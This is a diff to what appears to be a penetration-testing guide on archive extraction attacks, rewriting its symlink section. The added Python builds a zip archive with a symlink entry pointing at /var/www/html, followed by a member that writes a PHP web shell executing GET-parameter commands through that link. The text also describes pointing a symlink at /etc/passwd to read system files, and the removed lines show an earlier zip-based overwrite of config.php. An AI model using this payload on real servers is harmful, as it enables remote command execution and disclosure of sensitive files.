@@ -68,16 +68,20 @@ With arbitrary write, pick a path that yields execution or persistence:
 
 ## Symlink variant
 
-A second class abuses symbolic links inside the archive. The archive contains a symlink entry pointing at a sensitive path, followed by a regular entry that writes **through** the link:
+A second class abuses symbolic links inside the archive: a symlink entry pointing at a directory outside the unpack root, followed by a regular entry **beneath** that link, so the write lands at the link target. The two entries must be preserved in order, which a double `zip` add does not do (it updates the existing member), so build the archive with a tool that keeps ordered entries:
 
-```bash
-ln -s /var/www/html/config.php link
-# add the symlink, then a file whose name equals the link, to write through it
-zip --symlinks evil.zip link
-zip evil.zip link   # second member overwrites the link target on extract
+```python
+import zipfile
+z = zipfile.ZipFile("evil.zip", "w")
+# 1) a symlink entry 'evil' -> /var/www/html
+info = zipfile.ZipInfo("evil"); info.external_attr = (0o120777) << 16
+z.writestr(info, "/var/www/html")
+# 2) a regular entry written through it
+z.writestr("evil/shell.php", "<?php system($_GET['c']); ?>")
+z.close()
 ```
 
-Extractors that recreate symlinks and then write matching members will overwrite or disclose the linked file. Read-oriented variants point a symlink at `/etc/passwd` so a later "preview" or "re-download" of the archived file returns the link target's contents.
+On extractors that recreate the symlink before writing later members, `evil/shell.php` is written through the link into `/var/www/html`. Read-oriented variants point the symlink at `/etc/passwd` so a later preview or re-download of the archived path returns the link target's contents.
 
 ## Nested and mixed archives
 
